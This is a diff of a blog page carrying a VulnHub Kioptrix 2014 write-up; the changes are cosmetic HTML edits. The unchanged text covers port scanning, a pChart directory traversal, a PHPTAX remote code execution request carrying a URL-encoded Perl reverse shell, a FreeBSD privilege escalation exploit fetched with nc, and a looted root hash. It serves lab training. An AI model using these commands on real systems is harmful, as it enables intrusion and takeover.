@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20191008_vulnhub-kioptrix4.html"> « </a>📅 published on <code>09/Oct/2019</code><a href="/posts/20191010_vulnhub-lordoftheroot101.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix5/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -35,7 +35,7 @@
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_pchart">exploit_pchart</a><br />
 2. <code>8080/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_phptax">exploit_phptax</a>, <a href="https://github.com/7h3rAm/writeups#privesc_freebsd">privesc_freebsd</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Wed Oct  9 12:11:53 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/xml/_quick_tcp_nmap.xml 192.168.92.185
 Nmap scan report for 192.168.92.185
@@ -68,7 +68,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <pre class="nested"><code>80/tcp    |  http  |  Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
 8080/tcp  |  http  |  Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We use <code>searchsploit</code> to look for <code>pChart</code> exploits and find a directory traversal exploit. We use this exploit to view the contents of the <code>/etc/passwd</code> file:  </p>
 <pre class="nested"><code>searchsploit pchart
 searchsploit -x 31173
@@ -117,7 +117,7 @@ GET /phptax/data/rce.php?cmd=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.5.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot13.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.5.2" src="/static/files/posts_vulnhub_kioptrix5/screenshot14.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>www@kioptrix2014&gt; id
 uid=80(www) gid=80(www) groups=80(www)
 www@kioptrix2014&gt;  
@@ -137,7 +137,7 @@ www@kioptrix2014&gt; users
 root
 toor
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. While exploring the system, we look for privilege escalation exploits for FreeBSD 9 and find two hits. Since the target system doesn't have <code>wget</code> or <code>curl</code> we fallback on <code>nc</code> to download the exploit file. Once compiled, we execute the exploit and get elevated access:  </p>
 <pre class="nested"><code>searchsploit freebsd 9.0
 searchsploit -x 28718
@@ -155,11 +155,11 @@ gcc -o 28718 28718.c
 <pre class="nested"><code>cat /root/congrats.txt
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot20.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$1$DdHlo6rh$usiPcDoTR37eL7DAyLjhk1:0:0::0:0:Charlie &amp;:..............
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a>  </li>
 <li><a href="https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html">https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html</a>  </li>
